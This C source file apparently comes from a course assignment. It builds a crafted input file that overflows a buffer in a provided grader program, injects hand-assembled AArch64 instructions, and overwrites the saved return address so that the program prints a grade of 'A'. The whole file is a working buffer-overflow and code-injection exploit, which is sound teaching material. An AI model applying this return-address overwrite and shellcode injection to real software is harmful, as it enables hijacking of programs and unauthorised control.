/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: William Svoboda and Will Drury                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Write our names to a file named dataA, followed by enough null bytes 
   to pad assembly instructions (needs to be a multiple of four bytes) 
   Next write the machine code for the assembly instructions needed to 
   change the value of grade to 'A' and then print that grade. Finally, 
   fill the buf array in readString() with enough null bytes. Next, 
   write in machine code to dataA the address of the first instruction
   in  BSS, which will overwrite the return address stored in X30. 
   Return 0. */

int main(void)
{
   unsigned long ulData; /* the address with which to overwrite X30 */
   int i;
   unsigned int movA; /* mov W0, 'A' */
   unsigned int adrGrade; /* adr X1, grade */
   unsigned int strbA; /* strb W0, X1 */
   unsigned int bPrint; /* b (address of printf) */

   /* open the file */
   FILE *psFile;
   psFile = fopen("dataA", "w");

   /* write our names to the file */
   fprintf(psFile, "William and Will"); /* writes 16 bytes to file */
   
   /* write 16 bytes to the file */
   for (i = 0; i < 16; i++)
      putc(0x00, psFile); /* writes 00000000 */

   /* write 16 bytes of assembly instructions and fill up buf */
   movA = MiniAssembler_mov(0x0, 0x41);
   fwrite(&movA, sizeof(unsigned int), 1, psFile);

   adrGrade = MiniAssembler_adr(0x1, 0x420044, 0x42007C);
   fwrite(&adrGrade, sizeof(unsigned int), 1, psFile);

   strbA = MiniAssembler_strb(0x0, 0x1);
   fwrite(&strbA, sizeof(unsigned int), 1, psFile);

   bPrint = MiniAssembler_b(0x400864, 0x420084);
   fwrite(&bPrint, sizeof(unsigned int), 1, psFile);

   /* write the address of the first instruction of 
      our code in BSS to x30  */
   ulData = 0x420078;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   
   /* close the file */
   fclose(psFile);

   return 0;
}
